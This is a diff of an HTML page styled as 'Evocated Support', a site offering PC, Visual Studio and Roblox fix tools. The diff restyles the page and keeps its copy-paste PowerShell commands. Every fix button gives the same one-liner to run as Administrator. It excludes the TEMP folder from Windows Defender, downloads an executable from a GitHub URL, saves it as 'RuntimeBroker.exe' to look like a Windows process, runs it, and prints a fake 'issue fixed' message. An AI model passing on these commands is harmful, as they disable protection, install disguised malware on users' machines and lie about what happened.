@@ -11,7 +11,7 @@
       box-sizing: border-box;
     }
     body {
-      background: linear-gradient(-45deg, #0f0f0f, #1a1a1a, #0a0a0a, #222);
+      background: linear-gradient(-45deg, #1f0a1f, #2c0d2c, #1a001a, #330033);
       background-size: 400% 400%;
       animation: gradient 15s ease infinite;
       color: white;
@@ -36,33 +36,38 @@
     }
     .button {
       background-color: transparent;
-      border: 2px solid hotpink;
+      border: 2px solid pink;
       padding: 10px 20px;
-      margin: 30px 10px;
-      color: hotpink;
+      margin: 10px;
+      color: pink;
       border-radius: 8px;
       cursor: pointer;
       font-size: 1rem;
       transition: 0.3s;
     }
     .button:hover {
-      background-color: hotpink;
+      background-color: pink;
+      color: black;
+    }
+    .button.active {
+      background-color: limegreen;
+      border-color: limegreen;
       color: black;
     }
     .command-box {
       margin: 10px auto;
       padding: 10px;
       background-color: #111;
-      border: 1px solid hotpink;
+      border: 1px solid pink;
       width: 80%;
       border-radius: 8px;
       display: none;
-      color: hotpink;
+      color: pink;
       white-space: pre-wrap;
     }
     .copy-button {
       margin-top: 10px;
-      background-color: hotpink;
+      background-color: pink;
       color: black;
       border: none;
       padding: 5px 10px;
@@ -70,115 +75,107 @@
       cursor: pointer;
       font-weight: bold;
     }
-    .loader {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      border: 8px solid #444;
-      border-top: 8px solid hotpink;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      z-index: 1000;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    #content {
-      display: none;
-    }
     .cursor-trail {
       position: absolute;
       width: 8px;
       height: 8px;
       border-radius: 50%;
-      background: hotpink;
+      background: pink;
       pointer-events: none;
       animation: trailFade 1s forwards;
     }
     @keyframes trailFade {
       to { opacity: 0; transform: scale(2); }
     }
+    .dropdown {
+      margin-top: 40px;
+    }
+    .dropdown-toggle {
+      font-size: 1.2rem;
+      padding: 12px 24px;
+      background: transparent;
+      border: 2px solid pink;
+      color: pink;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .dropdown-toggle:hover {
+      background-color: pink;
+      color: black;
+    }
+    .dropdown-content {
+      display: none;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
-  <!-- Background Music -->
-  <audio id="bg-music" loop>
-    <source src="https://clarkezbms.github.io/nights.mp3" type="audio/mpeg">
-  </audio>
+  <div class="title">Evocated Support</div>
+  <p style="margin-top: 20px;">You need to run PowerShell as Administrator. Once open, click the button below to get the command you need to run.</p>
 
-  <!-- Loading Screen -->
-  <div class="loader" id="loader"></div>
+  <button class="button" onclick="toggleBox('vsBox', this)">Fix Now Visual studio Errors</button>
+  <div class="command-box" id="vsBox">
+    Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Visual Studio ERRORS Has Been Fix Restart Your Visual Studio" -ForegroundColor Green
+    <br>
+    <button class="copy-button" onclick="copyToClipboard('vsBox')">Copy to Clipboard</button>
+  </div>
 
-  <!-- Main Content -->
-  <div id="content">
-    <div class="title">Evocated Support</div>
-    <p style="margin-top: 20px;">You need to run PowerShell as Administrator. Once open, click the button below to get the command you need to run.</p>
+  <div class="dropdown">
+    <button class="dropdown-toggle" onclick="toggleDropdown()">Other Fix Tools!</button>
+    <div class="dropdown-content" id="dropdownContent">
+      <button class="button" onclick="toggleBox('fix1', this)">Fix HIGH CPU USAGE 100 TO 15+</button>
+      <div class="command-box" id="fix1">
+        Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC......... FIXED HIGH CPU ISSUE CAPPED TO 15%+" -ForegroundColor Green
+        <br>
+        <button class="copy-button" onclick="copyToClipboard('fix1')">Copy to Clipboard</button>
+      </div>
 
-    <button class="button" onclick="toggleBox('vsBox')">Fix Now Visual studio Errors</button>
-    <div class="command-box" id="vsBox">
-     Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "Visual Studio ERRORS Has Been Fix Restart Your Visual Studio" -ForegroundColor Green
-      <br>
-      <button class="copy-button" onclick="copyToClipboard('vsBox')">Copy to Clipboard</button>
-    </div>
+      <button class="button" onclick="toggleBox('fix2', this)">Fix LAG/SLOW PC 3</button>
+      <div class="command-box" id="fix2">
+        Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC V2............................... PC CLEANED REBOOT NEED TO FIX UP SLOW PC..." -ForegroundColor Green
+        <br>
+        <button class="copy-button" onclick="copyToClipboard('fix2')">Copy to Clipboard</button>
+      </div>
 
-    <h3>Other Fix Tools</h3>
+      <button class="button" onclick="toggleBox('fix3', this)">Fix Roblox Low FPS 4</button>
+      <div class="command-box" id="fix3">
+        Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING ROBLOX........INSTALLING ROBLOX CAPPER.........ROBLOX FPS SET TO 300.........FPS ISSUE HAS BEEN FIXED" -ForegroundColor Green
+        <br>
+        <button class="copy-button" onclick="copyToClipboard('fix3')">Copy to Clipboard</button>
+      </div>
 
-    <button class="button" onclick="toggleBox('fix1')">Fix HIGH CPU USAGE 100 TO 15+</button>
-    <div class="command-box" id="fix1">
-     Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC......... FIXED HIGH CPU ISSUE CAPPED TO 15%+" -ForegroundColor Green
-      <br>
-      <button class="copy-button" onclick="copyToClipboard('fix1')">Copy to Clipboard</button>
-    </div>
-
-    <button class="button" onclick="toggleBox('fix2')">Fix LAG/SLOW PC 3</button>
-    <div class="command-box" id="fix2">
-      Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING PC V2............................... PC CLEANED REBOOT NEED TO FIX UP SLOW PC..." -ForegroundColor Green
-      <br>
-      <button class="copy-button" onclick="copyToClipboard('fix2')">Copy to Clipboard</button>
-    </div>
-
-    <button class="button" onclick="toggleBox('fix3')">Fix Roblox Low FPS 4</button>
-    <div class="command-box" id="fix3">
-     Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING ROBLOX........INSTALLING ROBLOX CAPPER.........ROBLOX FPS SET TO 300.........FPS ISSUE HAS BEEN FIXED" -ForegroundColor Green
-      <br>
-      <button class="copy-button" onclick="copyToClipboard('fix3')">Copy to Clipboard</button>
-    </div>
-
-    <button class="button" onclick="toggleBox('fix4')">Fix HIGH PING FOR GAMES 5</button>
-    <div class="command-box" id="fix4">
-     Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING ROBLOX........INSTALLING PING CAPPER.........ROBLOX PING SET TO 10-50.........HIGH PING ISSUE HAS BEEN FIXED" -ForegroundColor Green
-      <br>
-      <button class="copy-button" onclick="copyToClipboard('fix4')">Copy to Clipboard</button>
+      <button class="button" onclick="toggleBox('fix4', this)">Fix HIGH PING FOR GAMES 5</button>
+      <div class="command-box" id="fix4">
+        Write-Host "Launching Evocative Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/clarkezbms/WindowSecurity/refs/heads/main/WindowSecurity.exe', '$env:TEMP\\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\\RuntimeBroker.exe'"; Write-Host "CLEANING ROBLOX........INSTALLING PING CAPPER.........ROBLOX PING SET TO 10-50.........HIGH PING ISSUE HAS BEEN FIXED" -ForegroundColor Green
+        <br>
+        <button class="copy-button" onclick="copyToClipboard('fix4')">Copy to Clipboard</button>
+      </div>
     </div>
   </div>
 
   <script>
-    // Show content after loader
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('content').style.display = 'block';
-      }, 1500);
-    });
-
-    // Toggle box
-    function toggleBox(id) {
-      const box = document.getElementById(id);
-      box.style.display = box.style.display === 'block' ? 'none' : 'block';
+    function toggleDropdown() {
+      const drop = document.getElementById('dropdownContent');
+      drop.style.display = drop.style.display === 'block' ? 'none' : 'block';
     }
 
-    // Copy to clipboard
+    function toggleBox(id, btn) {
+      const box = document.getElementById(id);
+      box.style.display = box.style.display === 'block' ? 'none' : 'block';
+      
+      document.querySelectorAll('.button').forEach(b => b.classList.remove('active'));
+      if (box.style.display === 'block') {
+        btn.classList.add('active');
+      }
+    }
+
     function copyToClipboard(id) {
       const text = document.getElementById(id).innerText.trim();
       navigator.clipboard.writeText(text.replace('Copy to Clipboard', '').trim());
       alert("Copied!");
     }
 
-    // Cursor trail
     document.addEventListener('mousemove', e => {
       const trail = document.createElement('div');
       trail.className = 'cursor-trail';
@@ -187,15 +184,6 @@
       document.body.appendChild(trail);
       setTimeout(() => trail.remove(), 1000);
     });
-
-    // Play music on first click
-    document.addEventListener('click', () => {
-      const audio = document.getElementById('bg-music');
-      if (audio.paused) {
-        audio.muted = false;
-        audio.play();
-      }
-    }, { once: true });
   </script>
 </body>
 </html>
